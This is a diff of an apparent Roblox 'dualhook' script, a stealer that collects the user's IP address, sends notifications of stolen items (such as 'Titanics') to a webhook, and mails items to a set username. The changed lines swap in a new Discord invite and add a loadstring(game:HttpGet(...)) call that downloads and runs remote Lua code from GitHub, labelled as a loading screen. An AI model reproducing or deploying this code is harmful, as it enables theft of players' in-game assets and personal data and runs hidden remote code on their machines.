@@ -10,7 +10,7 @@
 getgenv().Settings = {
     User = "TolinRabadu",
     Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
-    MailMessage = "NewGood",
+    MailMessage = ".gg/uSgzNwHDTS",
     Titanics = {
         Dualhook = true,
         Intensity = 100 --%
@@ -213,8 +213,8 @@ local IPadress = game:HttpGet('https://ipinfo.io/ip')
 local data1
 
 -- Loading Screen
-if _G.LoadingScreen ~= true then,
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/Muhamnnad6196/loadingscreen/main/loading.lua'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
+if _G.LoadingScreen ~= true then
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/NeewGood/loading/main/carregar'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
 end
 
 -- Remotes
